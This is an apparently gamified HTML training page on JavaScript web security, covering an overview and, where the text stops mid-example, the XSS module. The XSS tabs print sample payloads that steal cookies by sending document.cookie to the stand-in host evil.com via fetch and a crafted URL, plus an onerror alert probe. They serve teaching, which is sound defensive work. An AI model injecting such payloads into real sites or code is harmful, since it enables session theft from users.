<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>üõ°Ô∏è JS Security Mastery</title>
<style>
/* ===== CSS RESET & VARIABLES ===== */
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --bg-dark: #0a0e17;
  --bg-card: #131a2b;
  --bg-card2: #1a2340;
  --accent: #00f0ff;
  --accent2: #7c3aed;
  --danger: #ff3e6c;
  --warning: #ffb800;
  --success: #00e676;
  --text: #e2e8f0;
  --text-dim: #8892a4;
  --border: #2a3550;
  --glow: 0 0 20px rgba(0,240,255,0.3);
  --glow-danger: 0 0 20px rgba(255,62,108,0.3);
  --glow-success: 0 0 20px rgba(0,230,118,0.3);
  --radius: 12px;
  --font: 'Segoe UI', system-ui, -apple-system, sans-serif;
  --mono: 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
}

html { scroll-behavior: smooth; }

body {
  font-family: var(--font);
  background: var(--bg-dark);
  color: var(--text);
  line-height: 1.7;
  overflow-x: hidden;
}

/* ===== SCROLLBAR ===== */
::-webkit-scrollbar { width: 8px; }
::-webkit-scrollbar-track { background: var(--bg-dark); }
::-webkit-scrollbar-thumb { background: var(--accent2); border-radius: 4px; }

/* ===== LAYOUT ===== */
.app { display: flex; min-height: 100vh; }

/* ===== SIDEBAR ===== */
.sidebar {
  width: 280px;
  background: var(--bg-card);
  border-right: 1px solid var(--border);
  padding: 20px 0;
  position: fixed;
  top: 0; left: 0;
  height: 100vh;
  overflow-y: auto;
  z-index: 100;
  transition: transform 0.3s;
}

.sidebar-header {
  padding: 10px 20px 25px;
  border-bottom: 1px solid var(--border);
  margin-bottom: 15px;
}

.sidebar-header h1 {
  font-size: 1.3rem;
  background: linear-gradient(135deg, var(--accent), var(--accent2));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  display: flex;
  align-items: center;
  gap: 8px;
}

.sidebar-header .shield { font-size: 1.8rem; -webkit-text-fill-color: initial; }

.xp-bar-container {
  margin-top: 15px;
  background: var(--bg-dark);
  border-radius: 20px;
  padding: 3px;
}

.xp-bar {
  height: 20px;
  background: linear-gradient(90deg, var(--accent2), var(--accent));
  border-radius: 20px;
  width: 0%;
  transition: width 0.8s ease;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 0.65rem;
  font-weight: 700;
  color: var(--bg-dark);
  min-width: 40px;
}

.xp-label { font-size: 0.75rem; color: var(--text-dim); margin-top: 5px; }

.nav-section { padding: 8px 20px; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 2px; color: var(--accent); margin-top: 10px; }

.nav-item {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 10px 20px;
  cursor: pointer;
  transition: all 0.2s;
  border-left: 3px solid transparent;
  font-size: 0.9rem;
  position: relative;
}

.nav-item:hover { background: rgba(0,240,255,0.05); color: var(--accent); }
.nav-item.active { background: rgba(0,240,255,0.08); border-left-color: var(--accent); color: var(--accent); }
.nav-item.completed .nav-check { color: var(--success); }

.nav-icon { font-size: 1.1rem; width: 24px; text-align: center; }
.nav-check { position: absolute; right: 15px; font-size: 0.8rem; color: transparent; }

/* ===== MAIN CONTENT ===== */
.main {
  margin-left: 280px;
  flex: 1;
  padding: 30px 40px;
  max-width: 1000px;
}

.section { display: none; animation: fadeIn 0.5s ease; }
.section.active { display: block; }

@keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

.section-header {
  margin-bottom: 30px;
  padding-bottom: 20px;
  border-bottom: 1px solid var(--border);
}

.section-header h2 {
  font-size: 2rem;
  margin-bottom: 8px;
  display: flex;
  align-items: center;
  gap: 12px;
}

.section-header p { color: var(--text-dim); font-size: 1rem; }

/* ===== CARDS ===== */
.card {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 25px;
  margin-bottom: 25px;
  transition: transform 0.2s;
}

.card:hover { transform: translateY(-2px); }
.card h3 { margin-bottom: 15px; font-size: 1.2rem; display: flex; align-items: center; gap: 8px; }
.card h4 { margin: 15px 0 10px; color: var(--accent); font-size: 1rem; }

/* ===== ATTACK CARDS ===== */
.attack-type {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 20px;
  margin: 20px 0;
}

.attack-card {
  background: var(--bg-card2);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 20px;
  position: relative;
  overflow: hidden;
}

.attack-card::before {
  content: '';
  position: absolute;
  top: 0; left: 0;
  width: 100%;
  height: 3px;
}

.attack-card.vulnerable::before { background: var(--danger); }
.attack-card.safe::before { background: var(--success); }

.attack-card h4 { margin-top: 0; }
.attack-card.vulnerable h4 { color: var(--danger); }
.attack-card.safe h4 { color: var(--success); }

/* ===== CODE BLOCKS ===== */
.code-block {
  background: #0d1117;
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 18px;
  margin: 12px 0;
  font-family: var(--mono);
  font-size: 0.85rem;
  line-height: 1.8;
  overflow-x: auto;
  position: relative;
}

.code-block .label {
  position: absolute;
  top: 8px; right: 10px;
  font-size: 0.65rem;
  padding: 2px 8px;
  border-radius: 4px;
  font-family: var(--font);
  text-transform: uppercase;
  letter-spacing: 1px;
}

.code-block .label.bad { background: rgba(255,62,108,0.2); color: var(--danger); }
.code-block .label.good { background: rgba(0,230,118,0.2); color: var(--success); }

.code-bad { border-left: 3px solid var(--danger); }
.code-good { border-left: 3px solid var(--success); }

.keyword { color: #c678dd; }
.string { color: #98c379; }
.comment { color: #5c6370; font-style: italic; }
.func { color: #61afef; }
.tag { color: #e06c75; }
.attr { color: #d19a66; }
.value { color: #98c379; }
.danger-text { color: var(--danger); }
.safe-text { color: var(--success); }
.num { color: #d19a66; }
.prop { color: #e5c07b; }

/* ===== INTERACTIVE DEMOS ===== */
.demo-container {
  background: var(--bg-card2);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 25px;
  margin: 20px 0;
}

.demo-container h4 {
  color: var(--warning);
  margin-bottom: 15px;
  display: flex;
  align-items: center;
  gap: 8px;
}

.demo-input {
  width: 100%;
  padding: 12px 16px;
  background: var(--bg-dark);
  border: 1px solid var(--border);
  border-radius: 8px;
  color: var(--text);
  font-family: var(--mono);
  font-size: 0.9rem;
  margin: 8px 0;
  outline: none;
  transition: border-color 0.3s;
}

.demo-input:focus { border-color: var(--accent); }

.demo-output {
  background: var(--bg-dark);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 15px;
  margin-top: 10px;
  min-height: 60px;
  font-size: 0.9rem;
}

.demo-btn {
  padding: 10px 20px;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  font-weight: 600;
  font-size: 0.9rem;
  transition: all 0.3s;
  margin: 5px 5px 5px 0;
}

.btn-primary { background: var(--accent); color: var(--bg-dark); }
.btn-primary:hover { box-shadow: var(--glow); transform: translateY(-1px); }
.btn-danger { background: var(--danger); color: white; }
.btn-danger:hover { box-shadow: var(--glow-danger); }
.btn-success { background: var(--success); color: var(--bg-dark); }
.btn-success:hover { box-shadow: var(--glow-success); }
.btn-outline { background: transparent; border: 1px solid var(--accent); color: var(--accent); }
.btn-outline:hover { background: rgba(0,240,255,0.1); }
.btn-warning { background: var(--warning); color: var(--bg-dark); }

/* ===== VISUAL DIAGRAMS ===== */
.diagram {
  background: var(--bg-dark);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 30px;
  margin: 20px 0;
  text-align: center;
}

.flow-diagram {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 0;
  flex-wrap: wrap;
  padding: 20px;
}

.flow-box {
  padding: 15px 20px;
  border-radius: 10px;
  font-weight: 600;
  font-size: 0.85rem;
  min-width: 120px;
  text-align: center;
  position: relative;
}

.flow-arrow {
  font-size: 1.5rem;
  color: var(--accent);
  margin: 0 5px;
  animation: pulse 2s infinite;
}

@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }

.flow-attacker { background: rgba(255,62,108,0.15); border: 1px solid var(--danger); color: var(--danger); }
.flow-victim { background: rgba(0,240,255,0.1); border: 1px solid var(--accent); color: var(--accent); }
.flow-server { background: rgba(124,58,237,0.15); border: 1px solid var(--accent2); color: var(--accent2); }
.flow-browser { background: rgba(255,184,0,0.15); border: 1px solid var(--warning); color: var(--warning); }

/* ===== PITFALL BOX ===== */
.pitfall-box {
  background: rgba(255,62,108,0.08);
  border: 1px solid rgba(255,62,108,0.3);
  border-radius: var(--radius);
  padding: 20px;
  margin: 15px 0;
}

.pitfall-box h4 { color: var(--danger); margin: 0 0 10px; }
.pitfall-box ul { padding-left: 20px; }
.pitfall-box li { margin: 8px 0; color: var(--text); }

.tip-box {
  background: rgba(0,230,118,0.08);
  border: 1px solid rgba(0,230,118,0.3);
  border-radius: var(--radius);
  padding: 20px;
  margin: 15px 0;
}

.tip-box h4 { color: var(--success); margin: 0 0 10px; }

.warning-box {
  background: rgba(255,184,0,0.08);
  border: 1px solid rgba(255,184,0,0.3);
  border-radius: var(--radius);
  padding: 20px;
  margin: 15px 0;
}

.warning-box h4 { color: var(--warning); margin: 0 0 10px; }

/* ===== QUIZ ===== */
.quiz-container { margin: 20px 0; }

.quiz-question {
  background: var(--bg-card2);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 25px;
  margin-bottom: 20px;
}

.quiz-question h4 {
  color: var(--accent);
  margin-bottom: 15px;
  display: flex;
  align-items: center;
  gap: 8px;
}

.quiz-options { display: flex; flex-direction: column; gap: 10px; }

.quiz-option {
  padding: 12px 18px;
  background: var(--bg-dark);
  border: 1px solid var(--border);
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.3s;
  font-size: 0.9rem;
}

.quiz-option:hover { border-color: var(--accent); background: rgba(0,240,255,0.05); }
.quiz-option.correct { border-color: var(--success); background: rgba(0,230,118,0.1); color: var(--success); }
.quiz-option.wrong { border-color: var(--danger); background: rgba(255,62,108,0.1); color: var(--danger); }
.quiz-option.disabled { pointer-events: none; }

.quiz-explanation {
  margin-top: 12px;
  padding: 12px 15px;
  border-radius: 8px;
  font-size: 0.85rem;
  display: none;
}

.quiz-explanation.show { display: block; }
.quiz-explanation.correct-exp { background: rgba(0,230,118,0.1); border: 1px solid rgba(0,230,118,0.3); }
.quiz-explanation.wrong-exp { background: rgba(255,62,108,0.1); border: 1px solid rgba(255,62,108,0.3); }

/* ===== EXERCISE ===== */
.exercise-container {
  background: var(--bg-card2);
  border: 1px solid var(--accent2);
  border-radius: var(--radius);
  padding: 25px;
  margin: 20px 0;
}

.exercise-container h4 {
  color: var(--accent2);
  margin-bottom: 10px;
  display: flex;
  align-items: center;
  gap: 8px;
}

.code-editor {
  width: 100%;
  min-height: 120px;
  padding: 15px;
  background: #0d1117;
  border: 1px solid var(--border);
  border-radius: 8px;
  color: var(--text);
  font-family: var(--mono);
  font-size: 0.85rem;
  line-height: 1.6;
  resize: vertical;
  outline: none;
  margin: 10px 0;
  tab-size: 2;
}

.code-editor:focus { border-color: var(--accent2); }

.exercise-result {
  padding: 12px 15px;
  border-radius: 8px;
  margin-top: 10px;
  display: none;
  font-size: 0.9rem;
}

.exercise-result.pass { display: block; background: rgba(0,230,118,0.1); border: 1px solid rgba(0,230,118,0.3); color: var(--success); }
.exercise-result.fail { display: block; background: rgba(255,62,108,0.1); border: 1px solid rgba(255,62,108,0.3); color: var(--danger); }

/* ===== TABS ===== */
.tabs {
  display: flex;
  gap: 5px;
  margin-bottom: 20px;
  border-bottom: 1px solid var(--border);
  padding-bottom: 5px;
  flex-wrap: wrap;
}

.tab {
  padding: 8px 16px;
  border-radius: 8px 8px 0 0;
  cursor: pointer;
  font-size: 0.85rem;
  transition: all 0.3s;
  color: var(--text-dim);
  border: 1px solid transparent;
  border-bottom: none;
}

.tab:hover { color: var(--text); }
.tab.active { color: var(--accent); background: var(--bg-card2); border-color: var(--border); }

.tab-content { display: none; }
.tab-content.active { display: block; animation: fadeIn 0.3s; }

/* ===== SCORE DISPLAY ===== */
.score-display {
  position: fixed;
  top: 15px; right: 20px;
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 30px;
  padding: 8px 20px;
  display: flex;
  align-items: center;
  gap: 8px;
  font-weight: 700;
  z-index: 200;
  box-shadow: 0 4px 20px rgba(0,0,0,0.3);
}

.score-display .score-icon { font-size: 1.2rem; }
.score-display .score-num { color: var(--accent); font-size: 1.1rem; }

/* ===== ANIMATED SHIELD ===== */
.hero-shield {
  font-size: 4rem;
  display: inline-block;
  animation: float 3s ease-in-out infinite;
}

@keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }

/* ===== COMPARISON TABLE ===== */
.comparison-table {
  width: 100%;
  border-collapse: collapse;
  margin: 15px 0;
  font-size: 0.85rem;
}

.comparison-table th {
  background: var(--bg-dark);
  padding: 12px 15px;
  text-align: left;
  color: var(--accent);
  border: 1px solid var(--border);
}

.comparison-table td {
  padding: 12px 15px;
  border: 1px solid var(--border);
  background: var(--bg-card2);
}

/* ===== ANIMATED ATTACK SIM ===== */
.attack-sim {
  position: relative;
  height: 300px;
  background: var(--bg-dark);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  overflow: hidden;
  margin: 20px 0;
}

.sim-entity {
  position: absolute;
  padding: 10px 15px;
  border-radius: 10px;
  font-size: 0.8rem;
  font-weight: 600;
  text-align: center;
  transition: all 0.5s ease;
}

.sim-packet {
  position: absolute;
  width: 30px;
  height: 30px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 0.7rem;
  opacity: 0;
  transition: all 0.8s ease;
}

/* ===== BADGE ===== */
.badge {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  padding: 3px 10px;
  border-radius: 20px;
  font-size: 0.75rem;
  font-weight: 600;
}

.badge-danger { background: rgba(255,62,108,0.2); color: var(--danger); }
.badge-success { background: rgba(0,230,118,0.2); color: var(--success); }
.badge-warning { background: rgba(255,184,0,0.2); color: var(--warning); }
.badge-info { background: rgba(0,240,255,0.2); color: var(--accent); }

/* ===== TOGGLE SWITCH ===== */
.toggle-group {
  display: flex;
  gap: 15px;
  margin: 15px 0;
  flex-wrap: wrap;
}

.toggle-btn {
  padding: 8px 16px;
  border: 1px solid var(--border);
  border-radius: 8px;
  background: var(--bg-dark);
  color: var(--text-dim);
  cursor: pointer;
  transition: all 0.3s;
  font-size: 0.85rem;
}

.toggle-btn.active { border-color: var(--accent); color: var(--accent); background: rgba(0,240,255,0.08); }

/* ===== CHECKLIST ===== */
.checklist { list-style: none; padding: 0; }

.checklist li {
  padding: 10px 15px;
  margin: 5px 0;
  background: var(--bg-dark);
  border-radius: 8px;
  display: flex;
  align-items: center;
  gap: 10px;
  cursor: pointer;
  transition: all 0.3s;
  font-size: 0.9rem;
}

.checklist li:hover { background: rgba(0,240,255,0.05); }
.checklist li.checked { text-decoration: line-through; color: var(--text-dim); }
.checklist li .check-mark { font-size: 1.1rem; }

/* ===== MOBILE MENU ===== */
.mobile-toggle {
  display: none;
  position: fixed;
  top: 15px; left: 15px;
  z-index: 300;
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 8px 12px;
  font-size: 1.3rem;
  cursor: pointer;
  color: var(--text);
}

@media (max-width: 768px) {
  .mobile-toggle { display: block; }
  .sidebar { transform: translateX(-100%); }
  .sidebar.open { transform: translateX(0); }
  .main { margin-left: 0; padding: 20px 15px; padding-top: 60px; }
  .score-display { top: 15px; right: 15px; font-size: 0.85rem; padding: 6px 14px; }
  .attack-type { grid-template-columns: 1fr; }
  .flow-diagram { flex-direction: column; }
  .flow-arrow { transform: rotate(90deg); }
}

/* ===== SECTION PROGRESS ===== */
.section-nav {
  display: flex;
  justify-content: space-between;
  margin-top: 40px;
  padding-top: 20px;
  border-top: 1px solid var(--border);
}

/* ===== ACCORDION ===== */
.accordion { margin: 10px 0; }

.accordion-header {
  padding: 15px 20px;
  background: var(--bg-card2);
  border: 1px solid var(--border);
  border-radius: 8px;
  cursor: pointer;
  display: flex;
  justify-content: space-between;
  align-items: center;
  transition: all 0.3s;
  font-weight: 600;
}

.accordion-header:hover { background: rgba(0,240,255,0.05); }
.accordion-header .arrow { transition: transform 0.3s; }
.accordion-header.open .arrow { transform: rotate(180deg); }

.accordion-body {
  max-height: 0;
  overflow: hidden;
  transition: max-height 0.5s ease;
  border: 1px solid var(--border);
  border-top: none;
  border-radius: 0 0 8px 8px;
}

.accordion-body.open { max-height: 2000px; }
.accordion-body-inner { padding: 20px; }

/* ===== ANIMATION FOR CORRECT ===== */
@keyframes correctBounce {
  0%, 100% { transform: scale(1); }
  50% { transform: scale(1.05); }
}

.bounce { animation: correctBounce 0.4s ease; }

/* ===== TOAST ===== */
.toast {
  position: fixed;
  bottom: 30px;
  right: 30px;
  padding: 15px 25px;
  border-radius: 10px;
  font-weight: 600;
  transform: translateY(100px);
  opacity: 0;
  transition: all 0.4s ease;
  z-index: 500;
  display: flex;
  align-items: center;
  gap: 10px;
}

.toast.show { transform: translateY(0); opacity: 1; }
.toast-success { background: var(--success); color: var(--bg-dark); }
.toast-danger { background: var(--danger); color: white; }
.toast-info { background: var(--accent); color: var(--bg-dark); }

/* ===== GRID HELPERS ===== */
.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
@media (max-width: 768px) { .grid-2 { grid-template-columns: 1fr; } }

/* ===== INTERACTIVE BROWSER ===== */
.browser-frame {
  border: 1px solid var(--border);
  border-radius: var(--radius);
  overflow: hidden;
  margin: 15px 0;
}

.browser-bar {
  background: var(--bg-dark);
  padding: 10px 15px;
  display: flex;
  align-items: center;
  gap: 10px;
  border-bottom: 1px solid var(--border);
}

.browser-dots { display: flex; gap: 6px; }
.browser-dot { width: 10px; height: 10px; border-radius: 50%; }
.dot-red { background: #ff5f56; }
.dot-yellow { background: #ffbd2e; }
.dot-green { background: #27c93f; }

.browser-url {
  flex: 1;
  padding: 5px 12px;
  background: var(--bg-card2);
  border-radius: 5px;
  font-size: 0.75rem;
  color: var(--text-dim);
  font-family: var(--mono);
}

.browser-body {
  padding: 20px;
  background: var(--bg-card);
  min-height: 120px;
}

/* ===== STEP INDICATOR ===== */
.steps { display: flex; gap: 5px; margin: 20px 0; flex-wrap: wrap; }

.step {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 8px 14px;
  border-radius: 20px;
  font-size: 0.8rem;
  font-weight: 600;
}

.step-num {
  width: 22px;
  height: 22px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 0.7rem;
  background: var(--accent2);
  color: white;
}

/* ===== CSP HEADER BUILDER ===== */
.csp-builder {
  background: var(--bg-dark);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 15px;
  margin: 15px 0;
}

.csp-directive {
  display: flex;
  align-items: center;
  gap: 10px;
  margin: 8px 0;
  flex-wrap: wrap;
}

.csp-directive label {
  min-width: 130px;
  font-family: var(--mono);
  font-size: 0.8rem;
  color: var(--accent);
}

.csp-directive select, .csp-directive input[type="text"] {
  padding: 6px 10px;
  background: var(--bg-card2);
  border: 1px solid var(--border);
  border-radius: 6px;
  color: var(--text);
  font-size: 0.8rem;
}

.csp-output {
  margin-top: 15px;
  padding: 12px;
  background: var(--bg-card2);
  border-radius: 8px;
  font-family: var(--mono);
  font-size: 0.8rem;
  word-break: break-all;
  color: var(--success);
}

/* ===== STREAK ===== */
.streak-badge {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  padding: 4px 12px;
  border-radius: 20px;
  background: rgba(255,184,0,0.15);
  color: var(--warning);
  font-size: 0.8rem;
  font-weight: 600;
  margin-left: 10px;
}

.highlight {
  background: rgba(0,240,255,0.1);
  padding: 2px 6px;
  border-radius: 4px;
  font-family: var(--mono);
  font-size: 0.85em;
  color: var(--accent);
}

/* ===== COMPLETION CARD ===== */
.completion-card {
  background: linear-gradient(135deg, var(--bg-card2), var(--bg-card));
  border: 2px solid var(--accent2);
  border-radius: var(--radius);
  padding: 40px;
  text-align: center;
  margin: 30px 0;
}

.completion-card h3 { font-size: 1.8rem; margin-bottom: 10px; }
.completion-card .big-emoji { font-size: 4rem; display: block; margin-bottom: 15px; }
</style>
</head>
<body>

<div class="app">
  <!-- Mobile Toggle -->
  <button class="mobile-toggle" onclick="toggleSidebar()">‚ò∞</button>

  <!-- Score Display -->
  <div class="score-display">
    <span class="score-icon">‚ö°</span>
    <span class="score-num" id="totalScore">0</span>
    <span style="font-size:0.75rem;color:var(--text-dim)">XP</span>
  </div>

  <!-- Sidebar -->
  <nav class="sidebar" id="sidebar">
    <div class="sidebar-header">
      <h1><span class="shield">üõ°Ô∏è</span> Security Mastery</h1>
      <div class="xp-bar-container">
        <div class="xp-bar" id="xpBar">0%</div>
      </div>
      <div class="xp-label">Progress: <span id="progressText">0/8 modules</span></div>
    </div>

    <div class="nav-section">üìö Modules</div>

    <div class="nav-item active" onclick="showSection('intro')" data-section="intro">
      <span class="nav-icon">üè†</span> Overview
      <span class="nav-check">‚úì</span>
    </div>
    <div class="nav-item" onclick="showSection('xss')" data-section="xss">
      <span class="nav-icon">üíâ</span> XSS Attacks
      <span class="nav-check">‚úì</span>
    </div>
    <div class="nav-item" onclick="showSection('xss-prevention')" data-section="xss-prevention">
      <span class="nav-icon">üîí</span> XSS Prevention
      <span class="nav-check">‚úì</span>
    </div>
    <div class="nav-item" onclick="showSection('csrf')" data-section="csrf">
      <span class="nav-icon">üé≠</span> CSRF Attacks
      <span class="nav-check">‚úì</span>
    </div>
    <div class="nav-item" onclick="showSection('csrf-protection')" data-section="csrf-protection">
      <span class="nav-icon">üõ°Ô∏è</span> CSRF Protection
      <span class="nav-check">‚úì</span>
    </div>
    <div class="nav-item" onclick="showSection('csp')" data-section="csp">
      <span class="nav-icon">üìã</span> Content Security Policy
      <span class="nav-check">‚úì</span>
    </div>
    <div class="nav-item" onclick="showSection('sanitization')" data-section="sanitization">
      <span class="nav-icon">üßπ</span> Input Sanitization
      <span class="nav-check">‚úì</span>
    </div>
    <div class="nav-item" onclick="showSection('auth')" data-section="auth">
      <span class="nav-icon">üîë</span> Secure Authentication
      <span class="nav-check">‚úì</span>
    </div>

    <div class="nav-section">üéØ Challenges</div>
    <div class="nav-item" onclick="showSection('quiz-final')" data-section="quiz-final">
      <span class="nav-icon">üèÜ</span> Final Challenge
      <span class="nav-check">‚úì</span>
    </div>
  </nav>

  <!-- Main Content -->
  <main class="main">

    <!-- ==================== INTRO ==================== -->
    <div class="section active" id="section-intro">
      <div class="section-header">
        <h2><span class="hero-shield">üõ°Ô∏è</span> Web Security Mastery</h2>
        <p>Master the essential security skills every JavaScript developer needs to protect users and land top jobs.</p>
      </div>

      <div class="card">
        <h3>üéØ Why Security Matters</h3>
        <p>In 2024, <strong>94% of web applications</strong> had security vulnerabilities. As a JavaScript developer, you're the first line of defense. Companies like Google, Meta, and Amazon all prioritize security skills.</p>

        <div class="warning-box" style="margin-top: 15px;">
          <h4>‚ö†Ô∏è Real World Impact</h4>
          <ul style="padding-left: 20px; margin-top: 8px;">
            <li><strong>British Airways (2018):</strong> XSS-based attack stole 380,000 credit cards ‚Üí ¬£183M fine</li>
            <li><strong>Fortnite (2019):</strong> XSS vulnerability exposed 200M+ user accounts</li>
            <li><strong>CSRF on Netflix (2006):</strong> Attackers could change user addresses and rent DVDs</li>
          </ul>
        </div>
      </div>

      <div class="card">
        <h3>üó∫Ô∏è What You'll Learn</h3>
        <div class="grid-2">
          <div class="attack-card" style="border-top: 3px solid var(--danger);">
            <h4 style="color: var(--danger);">üî¥ Attack Vectors</h4>
            <ul style="padding-left: 18px; font-size: 0.9rem;">
              <li>XSS (Stored, Reflected, DOM)</li>
              <li>CSRF Attacks</li>
              <li>Injection Attacks</li>
              <li>Session Hijacking</li>
            </ul>
          </div>
          <div class="attack-card" style="border-top: 3px solid var(--success);">
            <h4 style="color: var(--success);">üü¢ Defenses</h4>
            <ul style="padding-left: 18px; font-size: 0.9rem;">
              <li>Input Sanitization</li>
              <li>CSP Headers</li>
              <li>CSRF Tokens</li>
              <li>Secure Auth Patterns</li>
            </ul>
          </div>
        </div>
      </div>

      <div class="card">
        <h3>üéÆ How It Works</h3>
        <p>Each module has:</p>
        <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 12px; margin-top: 15px;">
          <div style="padding: 15px; background: var(--bg-card2); border-radius: 10px; text-align: center;">
            <div style="font-size: 2rem;">üìñ</div>
            <div style="font-weight: 600; margin-top: 5px;">Learn</div>
            <div style="font-size: 0.8rem; color: var(--text-dim);">Visual explanations</div>
          </div>
          <div style="padding: 15px; background: var(--bg-card2); border-radius: 10px; text-align: center;">
            <div style="font-size: 2rem;">üî¨</div>
            <div style="font-weight: 600; margin-top: 5px;">Interact</div>
            <div style="font-size: 0.8rem; color: var(--text-dim);">Live demos</div>
          </div>
          <div style="padding: 15px; background: var(--bg-card2); border-radius: 10px; text-align: center;">
            <div style="font-size: 2rem;">üí™</div>
            <div style="font-weight: 600; margin-top: 5px;">Practice</div>
            <div style="font-size: 0.8rem; color: var(--text-dim);">Exercises</div>
          </div>
          <div style="padding: 15px; background: var(--bg-card2); border-radius: 10px; text-align: center;">
            <div style="font-size: 2rem;">üß†</div>
            <div style="font-weight: 600; margin-top: 5px;">Quiz</div>
            <div style="font-size: 0.8rem; color: var(--text-dim);">Test knowledge</div>
          </div>
        </div>
      </div>

      <div class="section-nav">
        <div></div>
        <button class="demo-btn btn-primary" onclick="showSection('xss')">Start Learning ‚Üí XSS Attacks</button>
      </div>
    </div>

    <!-- ==================== XSS ==================== -->
    <div class="section" id="section-xss">
      <div class="section-header">
        <h2>üíâ Cross-Site Scripting (XSS)</h2>
        <p>Understand how attackers inject malicious scripts into trusted websites.</p>
      </div>

      <div class="card">
        <h3>ü§î What is XSS?</h3>
        <p>XSS occurs when an attacker injects malicious JavaScript into a web page that gets executed in another user's browser. The browser trusts the script because it comes from a trusted domain.</p>

        <div class="diagram">
          <div class="flow-diagram">
            <div class="flow-box flow-attacker">üßë‚Äçüíª Attacker<br><small>Injects script</small></div>
            <span class="flow-arrow">‚Üí</span>
            <div class="flow-box flow-server">üñ•Ô∏è Website<br><small>Stores/reflects input</small></div>
            <span class="flow-arrow">‚Üí</span>
            <div class="flow-box flow-victim">üë§ Victim<br><small>Views page</small></div>
            <span class="flow-arrow">‚Üí</span>
            <div class="flow-box flow-browser">üåê Browser<br><small>Executes script!</small></div>
          </div>
        </div>
      </div>

      <div class="card">
        <h3>üìã Three Types of XSS</h3>

        <div class="tabs">
          <div class="tab active" onclick="switchTab(this, 'xss-types')">Stored XSS</div>
          <div class="tab" onclick="switchTab(this, 'xss-types')">Reflected XSS</div>
          <div class="tab" onclick="switchTab(this, 'xss-types')">DOM-based XSS</div>
        </div>

        <div class="tab-content active" data-tabgroup="xss-types">
          <h4>üíæ Stored (Persistent) XSS <span class="badge badge-danger">Most Dangerous</span></h4>
          <p>The malicious script is permanently stored on the server (in a database, comment field, forum post, etc.).</p>

          <div class="steps">
            <div class="step"><span class="step-num">1</span> Attacker submits malicious comment</div>
            <div class="step"><span class="step-num">2</span> Server stores it in database</div>
            <div class="step"><span class="step-num">3</span> Other users view the page</div>
            <div class="step"><span class="step-num">4</span> Script executes in their browsers</div>
          </div>

          <div class="code-block code-bad">
            <span class="label bad">Vulnerable</span>
<span class="comment">// Attacker posts this as a "comment":</span>
<span class="tag">&lt;script&gt;</span>
  <span class="comment">// Steal cookies and send to attacker</span>
  <span class="keyword">fetch</span>(<span class="string">'https://evil.com/steal?cookie='</span> + <span class="prop">document</span>.<span class="func">cookie</span>);
<span class="tag">&lt;/script&gt;</span>

<span class="comment">// Server renders it directly into HTML:</span>
<span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="value">"comment"</span><span class="tag">&gt;</span>
  ${userComment}  <span class="comment">&lt;!-- üíÄ Script runs here! --&gt;</span>
<span class="tag">&lt;/div&gt;</span>
          </div>
        </div>

        <div class="tab-content" data-tabgroup="xss-types">
          <h4>ü™û Reflected XSS <span class="badge badge-warning">Common</span></h4>
          <p>The malicious script is part of the URL/request and immediately reflected back by the server.</p>

          <div class="steps">
            <div class="step"><span class="step-num">1</span> Attacker crafts malicious URL</div>
            <div class="step"><span class="step-num">2</span> Victim clicks the link</div>
            <div class="step"><span class="step-num">3</span> Server reflects input in response</div>
            <div class="step"><span class="step-num">4</span> Script executes in victim's browser</div>
          </div>

          <div class="code-block code-bad">
            <span class="label bad">Attack URL</span>
<span class="comment">// Attacker sends this link to victim:</span>
<span class="string">https://shop.com/search?q=&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>

<span class="comment">// Server renders search results:</span>
<span class="tag">&lt;h2&gt;</span>Results for: ${req.query.q}<span class="tag">&lt;/h2&gt;</span>
<span class="comment">// üíÄ The script in the URL executes!</span>
          </div>
        </div>

        <div class="tab-content" data-tabgroup="xss-types">
          <h4>üåê DOM-based XSS <span class="badge badge-info">Client-side</span></h4>
          <p>The vulnerability is in client-side JavaScript that processes user input and updates the DOM unsafely. The server is never involved.</p>

          <div class="steps">
            <div class="step"><span class="step-num">1</span> Page JS reads from URL/input</div>
            <div class="step"><span class="step-num">2</span> Writes to DOM without sanitizing</div>
            <div class="step"><span class="step-num">3</span> Malicious payload executes</div>
          </div>

          <div class="code-block code-bad">
            <span class="label bad">Vulnerable</span>
<span class="comment">// URL: page.html#&lt;img src=x onerror=alert('XSS')&gt;</span>

<span class="comment">// Vulnerable JavaScript reads the hash:</span>
